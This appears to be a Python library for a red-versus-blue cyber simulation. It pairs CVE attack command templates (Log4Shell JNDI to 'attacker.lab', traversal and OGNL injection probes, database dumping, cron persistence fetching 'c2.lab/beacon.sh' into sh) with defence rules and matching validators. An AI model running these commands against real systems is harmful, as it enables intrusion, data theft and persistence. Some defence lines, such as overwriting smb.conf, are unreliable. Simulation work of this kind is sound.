from __future__ import annotations

import re
from typing import Iterable


VULN_ATTACK_COMMANDS: dict[str, str] = {
    "CVE-2021-44228_Log4Shell_RCE": "curl -s -H \"User-Agent: ${jndi:ldap://attacker.lab/a}\" http://{target}:8080/",
    "CVE-2021-41773_Apache_PathTraversal_RCE": "curl -s \"http://{target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd\"",
    "CVE-2023-4966_CitrixBleed_SessionHijack": "curl -k -s -H \"Host: {target}\" \"https://{target}/oauth/idp/.well-known/openid-configuration\"",
    "CVE-2019-19781_Citrix_ADC_PathTraversal_RCE": "curl -k -s \"https://{target}/vpn/../vpns/portal/scripts/newbm.pl\"",
    "CVE-2022-1388_F5_BIGIP_iControl_RCE": "curl -k -s -H \"X-F5-Auth-Token: a\" -H \"Connection: X-F5-Auth-Token\" -H \"Authorization: Basic YWRtaW46\" https://{target}/mgmt/tm/util/bash",
    "CVE-2021-26855_Exchange_ProxyLogon_SSRF": "curl -k -s \"https://{target}/ecp/{rand}.js\" -H \"X-BEResource=localhost~1942062522\"",
    "CVE-2022-22965_Spring4Shell_RCE": "curl -s -X POST \"http://{target}:8080/\" -d \"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di\"",
    "CVE-2017-5638_Struts2_RCE": "curl -s -H \"Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}\" http://{target}:8080/",
    "CVE-2023-34362_MOVEit_SQLi": "curl -s -X POST \"https://{target}/moveitisapi/moveitisapi.dll?action=m2\" --data \"Transaction=folder_add_by_path\"",
    "CVE-2022-26134_Confluence_OGNL_RCE": "curl -s \"http://{target}:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28'id'%29%7D/\"",
    "CVE-2021-26084_Confluence_OGNL_Injection": "curl -s -X POST \"http://{target}:8090/pages/createpage-entervariables.action?SpaceKey=x\" --data \"queryString=\\u0027+#{3*3}+\\u0027\"",
    "CVE-2021-34527_PrintNightmare_PrivEsc": "rpcclient -U 'DOMAIN\\\\user%pass' {target} -c 'spoolss'",
    "CVE-2017-0144_EternalBlue_SMB_RCE": "nmap -p445 --script smb-vuln-ms17-010 {target}",
    "CVE-2020-1472_ZeroLogon_AuthBypass": "python3 zerologon_tester.py {target}",
    "CVE-2021-44142_Samba_OOB_RCE": "nmap -p445 --script smb-vuln-cve-2021-44142 {target}",
    "CVE-2016-6662_MySQL_Config_Injection": "mysql -h {target} -u app -p'***' -e \"SET GLOBAL general_log_file='/var/lib/mysql/pwn.cnf'\"",
    "CVE-2012-2122_MySQL_Auth_Bypass": "mysql -h {target} -u root -p'wrongpass' --connect-timeout=2",
}

VULN_DEFENSE_RULES: dict[str, str] = {
    "CVE-2021-44228_Log4Shell_RCE": "SecRule REQUEST_HEADERS \"@rx (?i)\\$\\{jndi:(ldap|rmi|dns)\" \"id:1001,phase:1,deny,status:403,msg:'block jndi lookup'\"",
    "CVE-2021-41773_Apache_PathTraversal_RCE": "SecRule REQUEST_URI \"@rx /cgi-bin/\\.\\%2e/\" \"id:1002,phase:1,deny,status:403,msg:'block apache traversal'\"",
    "CVE-2023-4966_CitrixBleed_SessionHijack": "if ($request_uri ~* \"^/oauth/idp\") { return 403; }",
    "CVE-2019-19781_Citrix_ADC_PathTraversal_RCE": "rewrite ^/vpn/../vpns/portal/ - [F,L]",
    "CVE-2022-1388_F5_BIGIP_iControl_RCE": "if ($http_x_f5_auth_token != \"\") { return 403; }",
    "CVE-2021-26855_Exchange_ProxyLogon_SSRF": "SecRule REQUEST_HEADERS:X-BEResource \"@rx localhost~1942062522\" \"id:1003,phase:1,deny,status:403\"",
    "CVE-2022-22965_Spring4Shell_RCE": "SecRule ARGS \"@rx class\\.module\\.classLoader\" \"id:1010,phase:2,deny,status:403,msg:'block spring4shell pattern'\"",
    "CVE-2017-5638_Struts2_RCE": "SecRule REQUEST_HEADERS:Content-Type \"@rx \\%\\{\\(\" \"id:1011,phase:1,deny,status:403,msg:'block struts ognl header'\"",
    "CVE-2023-34362_MOVEit_SQLi": "SecRule REQUEST_BODY \"@rx Transaction=folder_add_by_path\" \"id:1012,phase:2,deny,status:403,msg:'block moveit sqli indicator'\"",
    "CVE-2022-26134_Confluence_OGNL_RCE": "SecRule REQUEST_URI \"@rx \\$\\{\\@java\\.lang\\.Runtime\" \"id:1013,phase:1,deny,status:403\"",
    "CVE-2021-26084_Confluence_OGNL_Injection": "SecRule REQUEST_BODY \"@rx queryString=.*#\\{\" \"id:1014,phase:2,deny,status:403\"",
    "CVE-2021-34527_PrintNightmare_PrivEsc": "Set-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint' -Name RestrictDriverInstallationToAdministrators -Type DWord -Value 1",
    "CVE-2017-0144_EternalBlue_SMB_RCE": "netsh advfirewall firewall add rule name='Block SMB 445' dir=in action=block protocol=TCP localport=445",
    "CVE-2020-1472_ZeroLogon_AuthBypass": "Set-ADDomainController -Identity {target} -Replace @{\"FullSecureChannelProtection\"=1}",
    "CVE-2021-44142_Samba_OOB_RCE": "printf '[global]\\nfruit:metadata=stream\\n' > /etc/samba/smb.conf && systemctl restart smb",
    "CVE-2016-6662_MySQL_Config_Injection": "chown root:mysql /etc/my.cnf && chmod 640 /etc/my.cnf && systemctl restart mysqld",
    "CVE-2012-2122_MySQL_Auth_Bypass": "ALTER USER 'root'@'%' IDENTIFIED WITH caching_sha2_password BY '<ROTATED>'; FLUSH PRIVILEGES;",
}

RED_GENERIC_COMMANDS: dict[str, str] = {
    "Recon": "nmap -sV -Pn --script=vuln {target}",
    "ExploitService": "msfconsole -q -x \"use exploit/multi/http/generic_check; set RHOSTS {target}; run; exit\"",
    "LateralMove": "proxychains crackmapexec smb {target} -u svc-backup -p '***'",
    "ExfiltrateDatabase": "mysqldump -h {target} -u app -p'***' --all-databases | gzip -c > /tmp/{target}_dump.sql.gz",
    "AnchorFoothold": "echo \"@reboot /usr/bin/curl -fsS http://c2.lab/beacon.sh | sh\" | crontab -",
    "ReactivateFoothold": "bash -lc '/usr/bin/curl -fsS http://c2.lab/beacon.sh | sh'",
}

BLUE_GENERIC_RULES: dict[str, str] = {
    "PatchNode": "ansible {target} -m package -a \"name='*security*' state=latest\"",
    "PreventivePatch": "ansible {target} -m package -a \"name='*security*' state=latest\" --check",
    "RestoreNode": "ansible {target} -m shell -a \"/opt/ir/restore_snapshot.sh --latest --service-recover\"",
    "DeepRestore": "ansible {target} -m shell -a \"/opt/ir/deep_restore.sh --rebuild --credential-reset\"",
    "Isolate": "ansible {target} -m shell -a \"iptables -I INPUT 1 -j DROP && iptables -I OUTPUT 1 -j DROP\"",
    "Monitor": "sigma rule: selection.target='{target}' and event.category in ('network','process') and level>=medium",
}


def _format_target(target: str | None) -> str:
    return target or "network"


def _render_template(template: str, *, target: str | None) -> str:
    rendered = template.replace("{target}", _format_target(target))
    rendered = rendered.replace("{rand}", "a")
    return rendered


def _normalize_text(value: str) -> str:
    collapsed = re.sub(r"\s+", " ", value.strip())
    return collapsed.lower()


def build_red_raw_command(
    *,
    action_type: str,
    target: str | None,
    vuln_id: str | None,
) -> str:
    if vuln_id and vuln_id in VULN_ATTACK_COMMANDS and action_type in {"ExploitService", "LateralMove", "ExfiltrateDatabase"}:
        return _render_template(VULN_ATTACK_COMMANDS[vuln_id], target=target)
    template = RED_GENERIC_COMMANDS.get(action_type, "echo \"unsupported red action\"")
    return _render_template(template, target=target)


def build_blue_defense_rule(
    *,
    action_type: str,
    target: str | None,
    vuln_id: str | None,
) -> str:
    if vuln_id and vuln_id in VULN_DEFENSE_RULES and action_type in {"PatchNode", "PreventivePatch", "Isolate"}:
        return _render_template(VULN_DEFENSE_RULES[vuln_id], target=target)
    template = BLUE_GENERIC_RULES.get(action_type, "echo \"unsupported blue action\"")
    return _render_template(template, target=target)


def expected_red_raw_commands(
    *,
    action_type: str,
    target: str | None,
    vuln_id: str | None,
) -> set[str]:
    rows: set[str] = {
        build_red_raw_command(action_type=action_type, target=target, vuln_id=vuln_id),
        build_red_raw_command(action_type=action_type, target=target, vuln_id=None),
    }
    if vuln_id and vuln_id in VULN_ATTACK_COMMANDS:
        rows.add(_render_template(VULN_ATTACK_COMMANDS[vuln_id], target=target))
    return rows


def expected_blue_defense_rules(
    *,
    action_type: str,
    target: str | None,
    vuln_id: str | None,
) -> set[str]:
    rows: set[str] = {
        build_blue_defense_rule(action_type=action_type, target=target, vuln_id=vuln_id),
        build_blue_defense_rule(action_type=action_type, target=target, vuln_id=None),
    }
    if vuln_id and vuln_id in VULN_DEFENSE_RULES:
        rows.add(_render_template(VULN_DEFENSE_RULES[vuln_id], target=target))
    return rows


def is_red_command_from_library(
    *,
    action_type: str,
    target: str | None,
    vuln_id: str | None,
    raw_command: str,
) -> bool:
    normalized = _normalize_text(raw_command)
    return normalized in {_normalize_text(row) for row in expected_red_raw_commands(action_type=action_type, target=target, vuln_id=vuln_id)}


def is_blue_rule_from_library(
    *,
    action_type: str,
    target: str | None,
    vuln_id: str | None,
    defense_rule: str,
) -> bool:
    normalized = _normalize_text(defense_rule)
    return normalized in {_normalize_text(row) for row in expected_blue_defense_rules(action_type=action_type, target=target, vuln_id=vuln_id)}


def command_library_slice(vuln_ids: Iterable[str]) -> dict[str, dict[str, str]]:
    rows: dict[str, dict[str, str]] = {}
    for vuln_id in vuln_ids:
        if vuln_id not in VULN_ATTACK_COMMANDS and vuln_id not in VULN_DEFENSE_RULES:
            continue
        rows[vuln_id] = {
            "attack_command": VULN_ATTACK_COMMANDS.get(vuln_id, ""),
            "defense_rule": VULN_DEFENSE_RULES.get(vuln_id, ""),
        }
    return rows
